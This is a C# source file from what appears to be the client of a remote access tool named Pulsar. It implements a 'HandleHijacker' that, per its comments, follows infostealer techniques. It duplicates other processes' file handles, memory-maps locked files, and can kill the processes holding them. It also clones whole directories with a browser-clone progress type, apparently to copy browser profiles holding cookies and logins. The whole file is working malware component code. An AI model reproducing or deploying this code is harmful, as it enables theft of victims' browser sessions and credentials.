using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Threading;
using Pulsar.Client.Recovery.Utilities.Xeno;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Advanced file reading using handle hijacking and memory mapping
    /// Based on XenoStealer techniques - reads locked files without killing processes
    /// </summary>
    internal static class HandleHijacker
    {
        #region Native Structures

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
        {
            public IntPtr Object;
            public IntPtr UniqueProcessId;
            public IntPtr HandleValue;
            public uint GrantedAccess;
            public ushort CreatorBackTraceIndex;
            public ushort ObjectTypeIndex;
            public uint HandleAttributes;
            public uint Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_HANDLE_INFORMATION_EX
        {
            public IntPtr NumberOfHandles;
            public IntPtr Reserved;
            // Handles follow after this
        }

        private enum SYSTEM_INFORMATION_CLASS
        {
            SystemExtendedHandleInformation = 64
        }

        private enum FileType : uint
        {
            FILE_TYPE_UNKNOWN = 0x0000,
            FILE_TYPE_DISK = 0x0001,
            FILE_TYPE_CHAR = 0x0002,
            FILE_TYPE_PIPE = 0x0003
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RM_UNIQUE_PROCESS
        {
            public uint dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strAppName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
            public string strServiceShortName;
            public uint ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bRestartable;
        }

        private enum RM_REBOOT_REASON
        {
            RmRebootReasonNone = 0x0,
            RmRebootReasonPermissionDenied = 0x1,
            RmRebootReasonSessionMismatch = 0x2,
            RmRebootReasonCriticalProcess = 0x4,
            RmRebootReasonCriticalService = 0x8,
            RmRebootReasonDetectedSelf = 0x10
        }

        #endregion

        #region Native Methods

        [DllImport("ntdll.dll")]
        private static extern uint NtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            IntPtr SystemInformation,
            uint SystemInformationLength,
            out uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwOptions);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern FileType GetFileType(IntPtr hFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern uint GetFinalPathNameByHandleW(
            IntPtr hFile,
            StringBuilder lpszFilePath,
            uint cchFilePath,
            uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr CreateFileMappingA(
            IntPtr hFile,
            IntPtr lpFileMappingAttributes,
            uint flProtect,
            uint dwMaximumSizeHigh,
            uint dwMaximumSizeLow,
            string lpName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetFileSizeEx(IntPtr hFile, out ulong lpFileSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr MapViewOfFile(
            IntPtr hFileMappingObject,
            uint dwDesiredAccess,
            uint dwFileOffsetHigh,
            uint dwFileOffsetLow,
            UIntPtr dwNumberOfBytesToMap);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        private static extern int RmStartSession(out uint pSessionHandle, uint dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        private static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        private static extern int RmRegisterResources(
            uint pSessionHandle,
            uint nFiles,
            string[] rgsFilenames,
            uint nApplications,
            RM_UNIQUE_PROCESS[] rgApplications,
            uint nServices,
            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll")]
        private static extern int RmGetList(
            uint dwSessionHandle,
            out uint pnProcInfoNeeded,
            ref uint pnProcInfo,
            [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
            out RM_REBOOT_REASON lpdwRebootReasons);

        #endregion

        #region Constants

        private const uint PROCESS_DUP_HANDLE = 0x0040;
        private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
        private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
        private const uint PAGE_READONLY = 0x02;
        private const uint FILE_MAP_READ = 0x04;
        private const uint FILE_NAME_NORMALIZED = 0x0;
        private const uint ERROR_MORE_DATA = 0xEA;

        #endregion

        /// <summary>
        /// Safely closes a handle, ignoring exceptions from pseudo-handles or invalid handles
        /// </summary>
        private static void SafeCloseHandle(IntPtr handle)
        {
            if (handle == IntPtr.Zero || handle == new IntPtr(-1))
                return;

            try
            {
                CloseHandle(handle);
            }
            catch
            {
                // Some handles (like pseudo-handles) throw exceptions when closed
                // This is expected and can be safely ignored
            }
        }

        /// <summary>
        /// Forces reading a file even if it's locked by another process
        /// Uses handle hijacking and memory mapping
        /// </summary>
        public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfFailed = false)
        {
            // First try normal read
            try
            {
                return File.ReadAllBytes(filePath);
            }
            catch (Exception e)
            {
                // -2147024864 is the HRESULT for file being used by another process
                if (e.HResult != -2147024864)
                {
                    return null;
                }
            }

            Debug.WriteLine($"[HandleHijacker] File locked: {filePath}");
            Debug.WriteLine("[HandleHijacker] Attempting handle hijacking...");

            bool hasPids = GetProcessesLockingFile(filePath, out int[] lockingProcesses);
            
            IntPtr pInfo = IntPtr.Zero;
            try
            {
                uint dwSize = 0;
                uint status;
                int handleStructSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

                pInfo = Marshal.AllocHGlobal(handleStructSize);
                do
                {
                    status = NtQuerySystemInformation(
                        SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                        pInfo,
                        dwSize,
                        out dwSize);

                    if (status == STATUS_INFO_LENGTH_MISMATCH)
                    {
                        pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                    }
                } while (status != 0);

                IntPtr pInfoBackup = pInfo;
                ulong numOfHandles = (ulong)Marshal.ReadIntPtr(pInfo);
                pInfo += 2 * IntPtr.Size;

                Debug.WriteLine($"[HandleHijacker] Scanning {numOfHandles} handles...");

                byte[] result = null;

                for (ulong i = 0; i < numOfHandles; i++)
                {
                    IntPtr handlePtr = pInfo + (int)(i * (uint)handleStructSize);
                    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleInfo = 
                        Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(handlePtr);

                    if (hasPids && !Array.Exists(lockingProcesses, pid => pid == (int)(uint)handleInfo.UniqueProcessId))
                    {
                        continue;
                    }

                    // dupe handle
                    if (DuplicateHandleFromProcess(
                        (int)handleInfo.UniqueProcessId,
                        handleInfo.HandleValue,
                        out IntPtr duppedHandle))
                    {
                        try
                        {
                            if (GetFileType(duppedHandle) != FileType.FILE_TYPE_DISK)
                            {
                                SafeCloseHandle(duppedHandle);
                                continue;
                            }

                            string handlePath = GetPathFromHandle(duppedHandle);
                            if (handlePath == null)
                            {
                                SafeCloseHandle(duppedHandle);
                                continue;
                            }

                            if (handlePath.StartsWith("\\\\?\\"))
                            {
                                handlePath = handlePath.Substring(4);
                            }

                            if (string.Equals(handlePath, filePath, StringComparison.OrdinalIgnoreCase))
                            {
                                Debug.WriteLine($"[HandleHijacker] Found matching handle from PID {handleInfo.UniqueProcessId}");
                                result = ReadFileBytesFromHandle(duppedHandle);
                                SafeCloseHandle(duppedHandle);

                                if (result != null)
                                {
                                    Debug.WriteLine($"[HandleHijacker] Successfully read {result.Length} bytes");
                                    break;
                                }
                            }

                            SafeCloseHandle(duppedHandle);
                        }
                        catch
                        {
                            SafeCloseHandle(duppedHandle);
                        }
                    }
                }

                Marshal.FreeHGlobal(pInfoBackup);

                if (result == null && killOwningProcessIfFailed && lockingProcesses != null)
                {
                    Debug.WriteLine($"[HandleHijacker] Handle hijacking failed for '{filePath}', killing locking processes...");
                    foreach (var pid in lockingProcesses)
                    {
                        try
                        {
                            var proc = Process.GetProcessById(pid);
                            Debug.WriteLine($"[HandleHijacker] Killing process PID {pid} ({proc.ProcessName})");
                            proc.Kill();
                        }
                        catch { }
                    }

                    System.Threading.Thread.Sleep(100);

                    try
                    {
                        result = File.ReadAllBytes(filePath);
                        Debug.WriteLine("[HandleHijacker] Successfully read after killing processes");
                    }
                    catch { }
                }

                return result;
            }
            finally
            {
                if (pInfo != IntPtr.Zero)
                {
                    try { Marshal.FreeHGlobal(pInfo); } catch { }
                }
            }
        }

        /// <summary>
        /// Copies a locked file using handle hijacking
        /// </summary>
        public static bool ForceCopyFile(string sourcePath, string destinationPath, bool killIfFailed = false)
        {
            if (FileHandlerXeno.CloneFileByHandleHijacking(sourcePath, destinationPath))
            {
                return true;
            }

            byte[] fileData = ForceReadFile(sourcePath, killIfFailed);
            if (fileData == null)
            {
                return false;
            }

            try
            {
                File.WriteAllBytes(destinationPath, fileData);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool DuplicateHandleFromProcess(int sourceProcessId, IntPtr sourceHandle, out IntPtr targetHandle)
        {
            targetHandle = IntPtr.Zero;

            IntPtr procHandle = OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProcessId);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr newHandle = IntPtr.Zero;
            bool success = DuplicateHandle(
                procHandle,
                sourceHandle,
                GetCurrentProcess(),
                ref newHandle,
                0,
                false,
                DUPLICATE_SAME_ACCESS);

            CloseHandle(procHandle);

            if (success && newHandle != IntPtr.Zero)
            {
                targetHandle = newHandle;
                return true;
            }

            return false;
        }

        private static string GetPathFromHandle(IntPtr fileHandle)
        {
            StringBuilder fileNameBuilder = new StringBuilder(32767 + 2);
            uint pathLen = GetFinalPathNameByHandleW(
                fileHandle,
                fileNameBuilder,
                (uint)fileNameBuilder.Capacity,
                FILE_NAME_NORMALIZED);

            if (pathLen == 0)
            {
                return null;
            }

            return fileNameBuilder.ToString(0, (int)pathLen);
        }

        private static byte[] ReadFileBytesFromHandle(IntPtr handle)
        {
            IntPtr fileMapping = CreateFileMappingA(handle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
            if (fileMapping == IntPtr.Zero)
            {
                return null;
            }

            try
            {
                if (!GetFileSizeEx(handle, out ulong fileSize))
                {
                    return null;
                }

                if (fileSize == 0)
                {
                    return new byte[0];
                }

                IntPtr baseAddress = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, (UIntPtr)fileSize);
                if (baseAddress == IntPtr.Zero)
                {
                    return null;
                }

                try
                {
                    byte[] fileData = new byte[fileSize];
                    Marshal.Copy(baseAddress, fileData, 0, (int)fileSize);
                    return fileData;
                }
                finally
                {
                    UnmapViewOfFile(baseAddress);
                }
            }
            finally
            {
                CloseHandle(fileMapping);
            }
        }

        private static bool GetProcessesLockingFile(string filePath, out int[] processes)
        {
            processes = null;

            string sessionKey = Guid.NewGuid().ToString();
            if (RmStartSession(out uint sessionHandle, 0, sessionKey) != 0)
            {
                return false;
            }

            try
            {
                string[] resources = new string[] { filePath };
                if (RmRegisterResources(sessionHandle, (uint)resources.Length, resources, 0, null, 0, null) != 0)
                {
                    return false;
                }

                uint nProcInfo = 0;
                int status = RmGetList(sessionHandle, out uint nProcInfoNeeded, ref nProcInfo, null, out _);

                if (status != ERROR_MORE_DATA)
                {
                    processes = new int[0];
                    return true;
                }

                RM_PROCESS_INFO[] affectedApps = new RM_PROCESS_INFO[nProcInfoNeeded];
                nProcInfo = nProcInfoNeeded;
                status = RmGetList(sessionHandle, out nProcInfoNeeded, ref nProcInfo, affectedApps, out _);

                if (status == 0)
                {
                    processes = new int[affectedApps.Length];
                    for (int i = 0; i < affectedApps.Length; i++)
                    {
                        processes[i] = (int)affectedApps[i].Process.dwProcessId;
                    }
                    return true;
                }

                return false;
            }
            finally
            {
                RmEndSession(sessionHandle);
            }
        }

        /// <summary>
        /// Copies an entire directory using handle hijacking for locked files
        /// </summary>
        public static bool ForceCopyDirectory(string sourceDir, string destDir, bool killIfFailed = false, IProgress<BrowserCloneProgress> progress = null, CancellationToken cancellationToken = default)
        {
            try
            {
                if (!Directory.Exists(sourceDir))
                {
                    return false;
                }

                Directory.CreateDirectory(destDir);

                var directories = new List<string>();
                foreach (string directory in Directory.EnumerateDirectories(sourceDir, "*", SearchOption.AllDirectories))
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    directories.Add(directory);
                }

                foreach (string directory in directories)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    string relativeDir = directory.Substring(sourceDir.Length)
                        .TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                    string targetDir = string.IsNullOrEmpty(relativeDir)
                        ? destDir
                        : Path.Combine(destDir, relativeDir);

                    Directory.CreateDirectory(targetDir);
                }

                var files = new List<string>();

                foreach (string file in Directory.EnumerateFiles(sourceDir, "*", SearchOption.AllDirectories))
                {
                    cancellationToken.ThrowIfCancellationRequested();
                    files.Add(file);
                }

                int totalFiles = files.Count;
                int processed = 0;

                progress?.Report(new BrowserCloneProgress(0, totalFiles, string.Empty, totalFiles == 0));

                foreach (string file in files)
                {
                    cancellationToken.ThrowIfCancellationRequested();

                    string relativePath = file.Substring(sourceDir.Length)
                        .TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                    string destFile = Path.Combine(destDir, relativePath);

                    string destFileDirectory = Path.GetDirectoryName(destFile);
                    if (!string.IsNullOrEmpty(destFileDirectory))
                    {
                        Directory.CreateDirectory(destFileDirectory);
                    }

                    try
                    {
                        File.Copy(file, destFile, true);
                    }
                    catch
                    {
                        ForceCopyFile(file, destFile, killIfFailed);
                    }

                    processed++;
                    progress?.Report(new BrowserCloneProgress(processed, totalFiles, relativePath));
                }

                progress?.Report(new BrowserCloneProgress(totalFiles, totalFiles, string.Empty));

                return true;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[HandleHijacker] Error copying directory: {ex.Message}");
                return false;
            }
        }
    }
}
